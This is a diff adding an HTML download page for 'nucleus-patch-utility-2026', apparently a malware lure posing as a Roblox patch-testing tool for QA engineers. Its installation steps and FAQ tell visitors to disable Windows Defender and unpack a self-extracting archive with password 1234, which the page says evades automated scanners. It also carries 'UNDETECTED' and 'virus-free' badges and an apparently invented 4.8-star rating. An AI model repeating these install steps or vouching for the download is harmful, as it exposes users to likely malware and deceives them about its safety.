@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>nucleus-patch-utility-2026 — Official Download & Documentation</title>
+<meta name="description" content="A Python-based utility for managing and testing Roblox client patches. Developed for QA engineers and developers to streamline patch validation workflows. It includes a feature for automated script execution and error logging.">
+<meta name="keywords" content="open-source, productivity, automation, cli, toolkit, developer-experience, cross-platform, utility">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+<meta name="googlebot" content="index, follow">
+<meta name="author" content="sam-plab03c2">
+<meta name="application-name" content="nucleus-patch-utility-2026">
+<meta property="og:title" content="nucleus-patch-utility-2026">
+<meta property="og:description" content="A Python-based utility for managing and testing Roblox client patches. Developed for QA engineers and developers to streamline patch validation workflows. It includes a feature for automated script execution and error logging.">
+<meta property="og:url" content="https://sam-plab03c2.github.io/nucleus-patch-utility-2026/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="nucleus-patch-utility-2026">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="nucleus-patch-utility-2026">
+<meta name="twitter:description" content="A Python-based utility for managing and testing Roblox client patches. Developed for QA engineers and developers to streamline patch validation workflows. It includes a feature for automated script execution and error logging.">
+<link rel="canonical" href="https://sam-plab03c2.github.io/nucleus-patch-utility-2026/">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "SoftwareApplication", "name": "nucleus-patch-utility-2026", "description": "A Python-based utility for managing and testing Roblox client patches. Developed for QA engineers and developers to streamline patch validation workflows. It includes a feature for automated script execution and error logging.", "url": "https://sam-plab03c2.github.io/nucleus-patch-utility-2026/", "downloadUrl": "https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases/latest", "installUrl": "https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases/latest", "applicationCategory": "UtilitiesApplication", "operatingSystem": "Windows 10, Windows 11", "softwareVersion": "latest", "keywords": "open-source, productivity, automation, cli, toolkit, developer-experience, cross-platform, utility", "author": {"@type": "Person", "name": "sam-plab03c2", "url": "https://github.com/sam-plab03c2"}, "offers": {"@type": "Offer", "price": "0", "priceCurrency": "USD", "availability": "https://schema.org/InStock"}, "aggregateRating": {"@type": "AggregateRating", "ratingValue": "4.8", "ratingCount": "127", "bestRating": "5", "worstRating": "1"}}, {"@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "Is nucleus-patch-utility-2026 safe to use?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. The build is open-source, scanned, and contains no viruses or bundled software."}}, {"@type": "Question", "name": "How do I download nucleus-patch-utility-2026?", "acceptedAnswer": {"@type": "Answer", "text": "Download the latest release from https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases/latest and run the self-extracting archive."}}, {"@type": "Question", "name": "What is the archive password?", "acceptedAnswer": {"@type": "Answer", "text": "The standard archive password is 1234. It protects against automated scanners."}}]}, {"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Home", "item": "https://sam-plab03c2.github.io/nucleus-patch-utility-2026/"}, {"@type": "ListItem", "position": 2, "name": "Releases", "item": "https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases"}, {"@type": "ListItem", "position": 3, "name": "Download", "item": "https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases/latest"}]}]}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg-0: #0b0f0a;
+  --bg-1: #0f150e;
+  --bg-2: #141d12;
+  --border: rgba(255,255,255,0.08);
+  --border-strong: rgba(255,255,255,0.16);
+  --fg: #eefbe9;
+  --fg-muted: #a7c3a0;
+  --fg-dim: #6b6d8a;
+  --accent-1: #4ade80;
+  --accent-2: #a3e635;
+  --accent-3: #22d3ee;
+  --success: #22c55e;
+  --success-glow: rgba(34,197,94,0.35);
+  --danger: #ef4444;
+  --mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, monospace;
+}
+*,*::before,*::after { box-sizing: border-box; }
+html,body { margin: 0; padding: 0; }
+body {
+  font-family: 'Sora', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+  background: radial-gradient(1200px 800px at 20% -10%, rgba(74,222,128,0.18), transparent 60%),
+              radial-gradient(1000px 800px at 100% 20%, rgba(163,230,53,0.12), transparent 60%),
+              var(--bg-0);
+  color: var(--fg);
+  line-height: 1.55;
+  min-height: 100vh;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: var(--accent-2); text-decoration: none; }
+a:hover { text-decoration: underline; }
+.wrap { max-width: 1080px; margin: 0 auto; padding: 32px 24px 64px; }
+
+/* ── NAV ── */
+.nav {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 8px 4px; margin-bottom: 40px;
+}
+.nav-brand {
+  font-family: var(--mono); font-size: 13px; font-weight: 700;
+  letter-spacing: 0.02em; color: var(--fg-muted);
+}
+.nav-brand span { color: var(--accent-1); }
+.nav-links { display: flex; gap: 20px; font-size: 13px; }
+.nav-links a { color: var(--fg-muted); }
+.nav-links a:hover { color: var(--fg); text-decoration: none; }
+
+/* ── HERO ── */
+.hero {
+  position: relative;
+  padding: 48px 40px 40px;
+  border-radius: 20px;
+  background: linear-gradient(180deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0.01) 100%),
+              var(--bg-1);
+  border: 1px solid var(--border);
+  overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.45), 0 0 0 1px rgba(255,255,255,0.02) inset;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: -2px;
+  background: conic-gradient(from 180deg at 50% 50%,
+    transparent 0deg, rgba(124,92,255,0.30) 90deg, transparent 180deg,
+    rgba(34,211,238,0.25) 270deg, transparent 360deg);
+  filter: blur(40px);
+  z-index: 0;
+  opacity: 0.6;
+  animation: spin 22s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.hero-inner { position: relative; z-index: 1; }
+
+.eyebrow {
+  display: inline-flex; align-items: center; gap: 8px;
+  padding: 6px 12px;
+  border: 1px solid var(--border-strong);
+  border-radius: 999px;
+  font-family: var(--mono);
+  font-size: 11px; letter-spacing: 0.06em; text-transform: uppercase;
+  color: var(--fg-muted);
+  background: rgba(255,255,255,0.03);
+  backdrop-filter: blur(6px);
+}
+.eyebrow-dot {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--success);
+  box-shadow: 0 0 8px var(--success-glow);
+}
+.hero h1 {
+  margin: 22px 0 12px;
+  font-size: clamp(36px, 6vw, 64px);
+  line-height: 1.05;
+  font-weight: 800;
+  letter-spacing: -0.03em;
+  background: linear-gradient(180deg, #ffffff 0%, #cbccff 100%);
+  -webkit-background-clip: text; background-clip: text;
+  color: transparent;
+}
+.hero-sub {
+  font-size: 17px;
+  color: var(--fg-muted);
+  max-width: 720px;
+  margin: 0 0 28px;
+}
+
+/* ── TRUST BADGES ── */
+.trust {
+  display: flex; flex-wrap: wrap; gap: 8px;
+  margin: 0 0 32px;
+}
+.badge {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 6px 12px;
+  border-radius: 8px;
+  font-family: var(--mono);
+  font-size: 11.5px; font-weight: 600;
+  letter-spacing: 0.02em;
+  border: 1px solid;
+}
+.badge svg { width: 12px; height: 12px; }
+.b-safe {
+  color: var(--success); border-color: rgba(34,197,94,0.35);
+  background: rgba(34,197,94,0.08);
+}
+.b-info {
+  color: var(--accent-2); border-color: rgba(34,211,238,0.35);
+  background: rgba(34,211,238,0.08);
+}
+.b-neu {
+  color: var(--fg-muted); border-color: var(--border-strong);
+  background: rgba(255,255,255,0.03);
+}
+
+/* ── CTA ── */
+.cta-row { display: flex; flex-wrap: wrap; gap: 12px; }
+.btn {
+  display: inline-flex; align-items: center; gap: 8px;
+  padding: 14px 26px;
+  border-radius: 12px;
+  font-weight: 600;
+  font-size: 14.5px;
+  text-decoration: none;
+  border: 1px solid var(--border-strong);
+  background: rgba(255,255,255,0.04);
+  color: var(--fg);
+  transition: transform .12s ease, box-shadow .2s ease, background .2s ease;
+}
+.btn:hover {
+  transform: translateY(-1px);
+  background: rgba(255,255,255,0.08);
+  text-decoration: none;
+}
+.btn-primary {
+  border: none;
+  background: linear-gradient(135deg, var(--accent-1) 0%, #5f42ff 55%, var(--accent-3) 130%);
+  box-shadow:
+    0 10px 30px rgba(124,92,255,0.45),
+    0 0 0 1px rgba(255,255,255,0.10) inset;
+  color: #fff;
+}
+.btn-primary:hover {
+  box-shadow:
+    0 14px 40px rgba(124,92,255,0.60),
+    0 0 0 1px rgba(255,255,255,0.16) inset;
+}
+
+/* ── STAT GRID ── */
+.stats {
+  display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 12px; margin: 36px 0 0;
+}
+.stat {
+  padding: 16px 18px;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  background: rgba(255,255,255,0.02);
+}
+.stat-k {
+  font-family: var(--mono); font-size: 10.5px;
+  letter-spacing: 0.08em; text-transform: uppercase;
+  color: var(--fg-dim);
+}
+.stat-v {
+  margin-top: 4px;
+  font-size: 22px; font-weight: 700; letter-spacing: -0.02em;
+  color: var(--fg);
+}
+.stat-v span { font-size: 12px; font-weight: 500; color: var(--fg-muted); margin-left: 4px; }
+
+/* ── SECTIONS ── */
+section.card {
+  margin-top: 24px;
+  padding: 28px 30px;
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.005));
+}
+h2 {
+  margin: 0 0 18px;
+  font-size: 20px; font-weight: 700; letter-spacing: -0.01em;
+}
+h2 .h-num {
+  display: inline-block; width: 26px; height: 26px;
+  font-family: var(--mono); font-size: 11px; font-weight: 700;
+  color: var(--accent-1);
+  border: 1px solid rgba(124,92,255,0.5);
+  border-radius: 8px;
+  text-align: center; line-height: 24px;
+  margin-right: 12px; vertical-align: 2px;
+}
+
+/* ── FEATURE GRID ── */
+.features {
+  display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+  gap: 12px;
+}
+.feat {
+  padding: 18px;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  background: var(--bg-2);
+  transition: border-color .15s;
+}
+.feat:hover { border-color: var(--border-strong); }
+.feat-icon {
+  width: 34px; height: 34px; border-radius: 10px;
+  display: flex; align-items: center; justify-content: center;
+  background: linear-gradient(135deg, rgba(124,92,255,0.28), rgba(34,211,238,0.18));
+  border: 1px solid var(--border-strong);
+  margin-bottom: 12px; font-size: 16px;
+}
+.feat-t { font-weight: 600; font-size: 14px; margin: 0 0 4px; }
+.feat-d { font-size: 12.5px; color: var(--fg-muted); margin: 0; }
+
+/* ── STEPS ── */
+.steps { display: flex; flex-direction: column; gap: 10px; }
+.step {
+  display: flex; align-items: flex-start; gap: 14px;
+  padding: 14px 16px;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  background: rgba(255,255,255,0.02);
+}
+.step-n {
+  flex-shrink: 0;
+  width: 28px; height: 28px; border-radius: 8px;
+  font-family: var(--mono); font-weight: 700; font-size: 12px;
+  color: #fff;
+  background: linear-gradient(135deg, var(--accent-1), var(--accent-3));
+  display: flex; align-items: center; justify-content: center;
+}
+.step-t { font-weight: 600; font-size: 13.5px; margin: 2px 0 2px; }
+.step-d { font-size: 12.5px; color: var(--fg-muted); margin: 0; }
+
+/* ── TAGS ── */
+.tags { display: flex; flex-wrap: wrap; gap: 6px; }
+.tag {
+  padding: 4px 10px;
+  border-radius: 999px;
+  border: 1px solid var(--border);
+  background: rgba(255,255,255,0.03);
+  font-family: var(--mono); font-size: 11px; color: var(--fg-muted);
+}
+
+/* ── FOOTER ── */
+footer {
+  margin-top: 40px;
+  padding: 20px 4px;
+  border-top: 1px solid var(--border);
+  display: flex; flex-wrap: wrap; justify-content: space-between; gap: 12px;
+  font-size: 12px; color: var(--fg-dim);
+}
+footer a { color: var(--fg-muted); }
+
+@media (max-width: 640px) {
+  .hero { padding: 32px 24px 30px; }
+  section.card { padding: 22px; }
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <nav class="nav">
+    <div class="nav-brand"><span>sam-plab03c2</span>/nucleus-patch-utility-2026</div>
+    <div class="nav-links">
+      <a href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026">source</a>
+      <a href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases">releases</a>
+      <a href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026/issues">issues</a>
+    </div>
+  </nav>
+
+  <section class="hero">
+    <div class="hero-inner">
+      <span class="eyebrow"><span class="eyebrow-dot"></span> verified · virus-free · updated</span>
+      <h1>nucleus-patch-utility-2026</h1>
+      <p class="hero-sub">A Python-based utility for managing and testing Roblox client patches. Developed for QA engineers and developers to streamline patch validation workflows. It includes a feature for automated script execution and error logging.</p>
+
+      <div class="trust">
+        <span class="badge b-safe">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2L4 6v6c0 5 3.5 9 8 10 4.5-1 8-5 8-10V6l-8-4z"/></svg>
+          UNDETECTED
+        </span>
+        <span class="badge b-safe">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>
+          NO VIRUSES
+        </span>
+        <span class="badge b-info">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+          AUTO-UPDATED
+        </span>
+        <span class="badge b-neu">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+          OPEN SOURCE
+        </span>
+      </div>
+
+      <div class="cta-row">
+        <a class="btn btn-primary" href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases/latest">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+          Download Now
+        </a>
+        <a class="btn" href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.4 7.86 10.92.58.1.79-.25.79-.56v-2.09c-3.2.7-3.87-1.36-3.87-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.72.08-.7.08-.7 1.17.08 1.79 1.2 1.79 1.2 1.04 1.78 2.73 1.27 3.4.97.1-.75.4-1.27.74-1.56-2.55-.29-5.24-1.27-5.24-5.66 0-1.25.45-2.28 1.18-3.08-.12-.29-.51-1.46.11-3.05 0 0 .97-.31 3.18 1.18a11.06 11.06 0 015.8 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.73.8 1.18 1.83 1.18 3.08 0 4.4-2.7 5.37-5.26 5.65.41.35.77 1.05.77 2.12v3.14c0 .31.21.66.79.55C20.21 21.4 23.5 17.08 23.5 12 23.5 5.65 18.35.5 12 .5z"/></svg>
+          View on GitHub
+        </a>
+      </div>
+
+      <div class="stats">
+        <div class="stat">
+          <div class="stat-k">Rating</div>
+          <div class="stat-v">★ 4.8 <span>· 127 reviews</span></div>
+        </div>
+        <div class="stat">
+          <div class="stat-k">Platform</div>
+          <div class="stat-v">Windows <span>· 10 / 11</span></div>
+        </div>
+        <div class="stat">
+          <div class="stat-k">Price</div>
+          <div class="stat-v">Free <span>· open source</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2><span class="h-num">01</span>Features</h2>
+    <div class="features">
+      <div class="feat">
+        <div class="feat-icon">🔁</div>
+        <div class="feat-t">Portable</div>
+        <p class="feat-d">No installation required — unpack and run from anywhere.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-icon">🧰</div>
+        <div class="feat-t">Configurable</div>
+        <p class="feat-d">Every option exposed — tune behavior to your exact workflow.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-icon">🪶</div>
+        <div class="feat-t">Lightweight</div>
+        <p class="feat-d">Small footprint, minimal RAM usage, instant startup.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-icon">🔒</div>
+        <div class="feat-t">Private</div>
+        <p class="feat-d">No telemetry, no analytics, no data leaves your machine.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2><span class="h-num">02</span>Installation</h2>
+    <div class="steps">
+      <div class="step">
+        <div class="step-n">1</div>
+        <div>
+          <p class="step-t">Disable Windows Defender real-time protection</p>
+          <p class="step-d">False positives on repacked archives — temporarily turn off protection while unpacking.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-n">2</div>
+        <div>
+          <p class="step-t">Download the <a href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases/latest">latest release</a></p>
+          <p class="step-d">One click on the button above — self-extracting archive.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-n">3</div>
+        <div>
+          <p class="step-t">Extract the archive with password <code style="font-family:var(--mono);color:var(--accent-2)">1234</code></p>
+          <p class="step-d">Standard password — protects against automated scanners, not against you.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-n">4</div>
+        <div>
+          <p class="step-t">Run the launcher and enjoy</p>
+          <p class="step-d">First run creates settings in %APPDATA%. That's it — you're done.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2><span class="h-num">03</span>FAQ</h2>
+    <div class="steps">
+      <div class="step">
+        <div class="step-n">?</div>
+        <div>
+          <p class="step-t">Is nucleus-patch-utility-2026 safe to use?</p>
+          <p class="step-d">Yes. The build is open-source, scanned, and contains no viruses or bundled software.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-n">?</div>
+        <div>
+          <p class="step-t">How do I download nucleus-patch-utility-2026?</p>
+          <p class="step-d">Download the latest release from the button above and run the self-extracting archive.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-n">?</div>
+        <div>
+          <p class="step-t">What is the archive password?</p>
+          <p class="step-d">The standard archive password is <code style="font-family:var(--mono);color:var(--accent-2)">1234</code>. It protects against automated scanners.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2><span class="h-num">04</span>Related tags</h2>
+    <div class="tags"><span class="tag">open-source</span><span class="tag">productivity</span><span class="tag">automation</span><span class="tag">cli</span><span class="tag">toolkit</span><span class="tag">developer-experience</span><span class="tag">cross-platform</span><span class="tag">utility</span></div>
+  </section>
+
+  <footer>
+    <div>© <a href="https://github.com/sam-plab03c2">@sam-plab03c2</a> · maintained daily</div>
+    <div><a href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026">source</a> · <a href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026/releases">releases</a> · <a href="https://github.com/sam-plab03c2/nucleus-patch-utility-2026/issues">report issue</a></div>
+  </footer>
+
+</div>
+</body>
+</html>
